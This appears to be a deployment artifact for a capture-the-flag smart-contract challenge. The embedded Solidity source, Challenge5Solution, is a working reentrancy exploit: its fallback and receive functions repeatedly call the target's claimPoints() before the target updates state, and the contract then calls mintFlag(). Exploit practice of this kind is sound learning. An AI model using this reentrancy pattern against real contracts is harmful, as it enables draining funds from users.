@@ -1,0 +1,136 @@
+{
+  "address": "0xaAaBED06c21B9d859fF22917eA68d23210BFaE40",
+  "abi": [
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "_target",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "nonpayable",
+      "type": "constructor"
+    },
+    {
+      "stateMutability": "payable",
+      "type": "fallback"
+    },
+    {
+      "inputs": [],
+      "name": "attack",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "remaining",
+      "outputs": [
+        {
+          "internalType": "uint256",
+          "name": "",
+          "type": "uint256"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "target",
+      "outputs": [
+        {
+          "internalType": "address",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "stateMutability": "payable",
+      "type": "receive"
+    }
+  ],
+  "transactionHash": "0xfa0009bbb48434e86822d2fcd28651b8aa62a3fe841c07765d4e9e174f0573aa",
+  "receipt": {
+    "to": null,
+    "from": "0xf68da68C7894b62aaA893D49F3B119177C98dE69",
+    "contractAddress": "0xaAaBED06c21B9d859fF22917eA68d23210BFaE40",
+    "transactionIndex": 44,
+    "gasUsed": "228620",
+    "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+    "blockHash": "0x94d7c6d8baedb2ad1a1a49ef8545a9b808041cb7e15edde9bbc37bfcb1087f83",
+    "transactionHash": "0xfa0009bbb48434e86822d2fcd28651b8aa62a3fe841c07765d4e9e174f0573aa",
+    "logs": [],
+    "blockNumber": 140206367,
+    "cumulativeGasUsed": "5435373",
+    "status": 1,
+    "byzantium": true
+  },
+  "args": [
+    "0xB76AdFe9a791367A8fCBC2FDa44cB1a2c39D8F59"
+  ],
+  "numDeployments": 1,
+  "solcInputHash": "832ff6c3f67d5f7e367610c1aef7f869",
+  "metadata": "{\"compiler\":{\"version\":\"0.8.20+commit.a1b79de6\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_target\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"remaining\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"target\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/Challenge5Solution.sol\":\"Challenge5Solution\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Challenge5Solution.sol\":{\"content\":\"//SPDX-License-Identifier: MIT\\npragma solidity >=0.8.0 <0.9.0;\\n\\ninterface IChallenge5 {\\n    function claimPoints() external;\\n\\n    function mintFlag() external;\\n}\\n\\ncontract Challenge5Solution {\\n    address public target;\\n    bool private inClaim;\\n    uint256 public remaining;\\n\\n    constructor(address _target) {\\n        target = _target;\\n    }\\n\\n    function attack() external {\\n        require(!inClaim, \\\"busy\\\");\\n        inClaim = true;\\n        remaining = 10;\\n        IChallenge5(target).claimPoints();\\n        inClaim = false;\\n        IChallenge5(target).mintFlag();\\n    }\\n\\n    function _reenter() internal {\\n        // reenter until remaining points reached\\n        if (inClaim && remaining > 1) {\\n            remaining -= 1;\\n            IChallenge5(target).claimPoints();\\n        }\\n    }\\n\\n    fallback() external payable {\\n        _reenter();\\n    }\\n\\n    receive() external payable {\\n        _reenter();\\n    }\\n}\\n\",\"keccak256\":\"0x185d6e12667f9be39b3b7cc27b40d0ee516025af6a5f80a9ed53ebd0ac23ee09\",\"license\":\"MIT\"}},\"version\":1}",
+  "bytecode": "0x608060405234801561001057600080fd5b5060405161034e38038061034e83398101604081905261002f91610054565b600080546001600160a01b0319166001600160a01b0392909216919091179055610084565b60006020828403121561006657600080fd5b81516001600160a01b038116811461007d57600080fd5b9392505050565b6102bb806100936000396000f3fe6080604052600436106100385760003560e01c806355234ec01461004f5780639e5faafc14610078578063d4b839921461008d57610047565b36610047576100456100c5565b005b6100456100c5565b34801561005b57600080fd5b5061006560015481565b6040519081526020015b60405180910390f35b34801561008457600080fd5b50610045610157565b34801561009957600080fd5b506000546100ad906001600160a01b031681565b6040516001600160a01b03909116815260200161006f565b600054600160a01b900460ff1680156100df575060018054115b156101555760018060008282546100f6919061025e565b909155505060008054604080516304d092c760e01b815290516001600160a01b03909216926304d092c79260048084019382900301818387803b15801561013c57600080fd5b505af1158015610150573d6000803e3d6000fd5b505050505b565b600054600160a01b900460ff16156101a35760405162461bcd60e51b815260040161019a906020808252600490820152636275737960e01b604082015260600190565b60405180910390fd5b6000805460ff60a01b198116600160a01b178255600a600155604080516304d092c760e01b815290516001600160a01b03909216926304d092c79260048084019382900301818387803b1580156101f957600080fd5b505af115801561020d573d6000803e3d6000fd5b50506000805460ff60a01b19811682556040805163e00d023f60e01b815290516001600160a01b03909216945063e00d023f9350600480820193929182900301818387803b15801561013c57600080fd5b8181038181111561027f57634e487b7160e01b600052601160045260246000fd5b9291505056fea2646970667358221220f2fa9b760a73fc1268f29579ca3a0681456c9f11920e6ca58f0317e83e36730664736f6c63430008140033",
+  "deployedBytecode": "0x6080604052600436106100385760003560e01c806355234ec01461004f5780639e5faafc14610078578063d4b839921461008d57610047565b36610047576100456100c5565b005b6100456100c5565b34801561005b57600080fd5b5061006560015481565b6040519081526020015b60405180910390f35b34801561008457600080fd5b50610045610157565b34801561009957600080fd5b506000546100ad906001600160a01b031681565b6040516001600160a01b03909116815260200161006f565b600054600160a01b900460ff1680156100df575060018054115b156101555760018060008282546100f6919061025e565b909155505060008054604080516304d092c760e01b815290516001600160a01b03909216926304d092c79260048084019382900301818387803b15801561013c57600080fd5b505af1158015610150573d6000803e3d6000fd5b505050505b565b600054600160a01b900460ff16156101a35760405162461bcd60e51b815260040161019a906020808252600490820152636275737960e01b604082015260600190565b60405180910390fd5b6000805460ff60a01b198116600160a01b178255600a600155604080516304d092c760e01b815290516001600160a01b03909216926304d092c79260048084019382900301818387803b1580156101f957600080fd5b505af115801561020d573d6000803e3d6000fd5b50506000805460ff60a01b19811682556040805163e00d023f60e01b815290516001600160a01b03909216945063e00d023f9350600480820193929182900301818387803b15801561013c57600080fd5b8181038181111561027f57634e487b7160e01b600052601160045260246000fd5b9291505056fea2646970667358221220f2fa9b760a73fc1268f29579ca3a0681456c9f11920e6ca58f0317e83e36730664736f6c63430008140033",
+  "devdoc": {
+    "kind": "dev",
+    "methods": {},
+    "version": 1
+  },
+  "userdoc": {
+    "kind": "user",
+    "methods": {},
+    "version": 1
+  },
+  "storageLayout": {
+    "storage": [
+      {
+        "astId": 10,
+        "contract": "contracts/Challenge5Solution.sol:Challenge5Solution",
+        "label": "target",
+        "offset": 0,
+        "slot": "0",
+        "type": "t_address"
+      },
+      {
+        "astId": 12,
+        "contract": "contracts/Challenge5Solution.sol:Challenge5Solution",
+        "label": "inClaim",
+        "offset": 20,
+        "slot": "0",
+        "type": "t_bool"
+      },
+      {
+        "astId": 14,
+        "contract": "contracts/Challenge5Solution.sol:Challenge5Solution",
+        "label": "remaining",
+        "offset": 0,
+        "slot": "1",
+        "type": "t_uint256"
+      }
+    ],
+    "types": {
+      "t_address": {
+        "encoding": "inplace",
+        "label": "address",
+        "numberOfBytes": "20"
+      },
+      "t_bool": {
+        "encoding": "inplace",
+        "label": "bool",
+        "numberOfBytes": "1"
+      },
+      "t_uint256": {
+        "encoding": "inplace",
+        "label": "uint256",
+        "numberOfBytes": "32"
+      }
+    }
+  }
+}
